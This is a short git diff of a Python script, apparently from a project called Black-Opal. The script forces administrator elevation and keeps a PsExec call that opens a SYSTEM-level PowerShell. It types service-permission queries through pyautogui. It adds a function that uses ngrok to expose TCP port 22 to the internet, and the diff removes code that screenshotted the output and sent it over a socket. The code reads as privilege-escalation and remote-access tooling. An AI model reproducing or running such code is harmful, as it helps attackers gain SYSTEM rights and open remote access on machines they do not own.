@@ -6,24 +6,23 @@ import subprocess
 from multiprocessing import Process
 from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.txt
 
+
+def start_server():
+    subprocess.Popen(['cmd.exe', '/c', 'cd C:/Users/cyn0v/OneDrive/Documents/GitHub/Black-Opal/Resources && ngrok.exe tcp 22'])
+    time.sleep(2)
+    
+    
 def priv_escaltion():
     #run exe file from path
     os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
     
-
-#def priv_escaltion():
-#    #run exe file from path
-#    subprocess.call(['SysinternalsSuite\PsExec.exe', '-s', 'powershell.exe'])
-
-
-
 def commands():
-    time.sleep(4)
+    time.sleep(2)
     pyautogui.write("sc.exe sdshow scmanager")
     pyautogui.press("enter")
-    #take screenshot of output
-    message = pyautogui.screenshot("screenshot.png")
-    send_message(message, 9494)
+    pyautogui.write("sc.exe sdshow scmanager")
+    pyautogui.press("enter")
+    pass
    
 def send_message(port, message):
     #send message
@@ -33,9 +32,10 @@ def send_message(port, message):
 
 @main_requires_admin
 def main():
-    p1 = Process(target = priv_escaltion)
-    p1.start()
-    p2 = Process(target = commands)
+    default_path = os.getcwd()
+    #p1 = Process(target = priv_escaltion)
+    #p1.start()
+    p2 = Process(target = start_server)
     p2.start()
     
 
